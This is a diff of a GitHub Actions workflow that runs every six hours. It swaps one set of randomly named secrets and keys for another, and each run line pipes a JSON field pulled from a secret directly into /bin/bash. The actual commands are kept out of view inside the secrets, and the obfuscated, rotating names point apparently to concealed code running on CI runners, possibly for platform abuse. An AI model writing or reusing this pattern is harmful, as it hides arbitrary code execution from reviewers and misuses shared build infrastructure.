@@ -3,27 +3,22 @@ name: huazige2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 3/6 * * *'
-
-jobs:  # 11895
+    - cron: '18 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huazige2345
         env:
-          e03: ${{ secrets.e03 }}
+          glmie771: ${{ secrets.glmie771 }}
         run: |
-          echo $e03 | jq -r .ngcwa414 | /bin/bash
-          echo $ozscd6 | jq -r .pwsls25 | /bin/bash
-          echo $skr4351 | jq -r .si530 | /bin/bash
-          echo $kikaa07968 | jq -r .mvm8 | /bin/bash
-          echo $y1027 | jq -r .mjou98182 | /bin/bash
-          echo $xwke345 | jq -r .clbhd15 | /bin/bash
-          echo $yx63137 | jq -r .ls5 | /bin/bash
-          echo $hef4880 | jq -r .z333 | /bin/bash
-          echo $pdh11 | jq -r .xl85 | /bin/bash
-          echo $jt02 | jq -r .ekh2 | /bin/bash
-          echo $n051 | jq -r .ie087 | /bin/bash
+          echo $glmie771 | jq -r .h4 | /bin/bash
+          echo $rajrf7449 | jq -r .jgzk143 | /bin/bash
+          echo $bkkao9933 | jq -r .arxu43 | /bin/bash
+          echo $b04919 | jq -r .d8 | /bin/bash
+          echo $bub464 | jq -r .rpxx223 | /bin/bash
+          echo $tnz7663 | jq -r .uff8046 | /bin/bash
+          echo $dbuy397 | jq -r .khfqa84737 | /bin/bash
+          echo $x500 | jq -r .gg9239 | /bin/bash
 
